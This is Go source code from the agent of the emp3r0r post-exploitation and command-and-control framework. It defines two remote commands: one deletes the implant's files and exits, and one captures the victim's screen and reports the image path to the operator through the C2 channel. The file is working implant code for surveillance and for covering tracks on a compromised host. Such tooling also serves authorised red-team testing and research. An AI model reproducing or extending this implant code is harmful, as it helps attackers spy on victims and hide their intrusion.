package handler

import (
	"log"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/spf13/cobra"
)

// suicideCmdRun deletes agent files and exits.
func suicideCmdRun(cmd *cobra.Command, args []string) {
	if len(args) != 0 {
		c2transport.C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	if err := os.RemoveAll(common.RuntimeConfig.AgentRoot); err != nil {
		c2transport.C2RespPrintf(cmd, "Failed to cleanup files: %v", err)
	} else {
		c2transport.C2RespPrintf(cmd, "Cleanup successful, exiting")
	}
	log.Println("Exiting...")
	os.Exit(0)
}

// screenshotCmdRun takes a screenshot and returns its path.
func screenshotCmdRun(cmd *cobra.Command, args []string) {
	out, err := modules.Screenshot()
	if err != nil || out == "" {
		c2transport.C2RespPrintf(cmd, "Error: failed to take screenshot: %v", err)
		return
	}
	// Move file to agent's root directory.
	newPath := common.RuntimeConfig.AgentRoot + "/" + out
	if err := os.Rename(out, newPath); err != nil {
		log.Printf("screenshot rename error: %v", err)
		c2transport.C2RespPrintf(cmd, "screenshot rename error: %v", err)
		return
	}
	c2transport.C2RespPrintf(cmd, "%s", newPath)
}
